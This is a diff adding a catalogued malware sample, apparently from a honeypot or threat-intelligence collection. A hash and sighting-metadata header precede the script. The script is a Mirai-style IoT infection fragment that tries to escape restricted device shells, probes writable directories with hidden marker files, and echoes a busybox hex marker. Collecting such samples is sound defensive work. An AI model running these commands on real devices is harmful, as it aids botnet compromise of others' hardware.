@@ -1,0 +1,18 @@
+# sha256: c5b83280fffdfea3a304591493b645bd7f0240c950670d5f3b19a69815350767
+# family: script_generic
+# kind: script
+# size_bytes: 248
+# first_seen: 2026-08-29 06:33:52.693000 UTC
+# times_seen: 1
+# yara_matches: none
+# ------------------------------------------------------------
+
+start
+enable
+config terminal
+system
+linuxshell
+su
+shell
+sh
+>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x54\x44\x53\x4c\x52\x53'
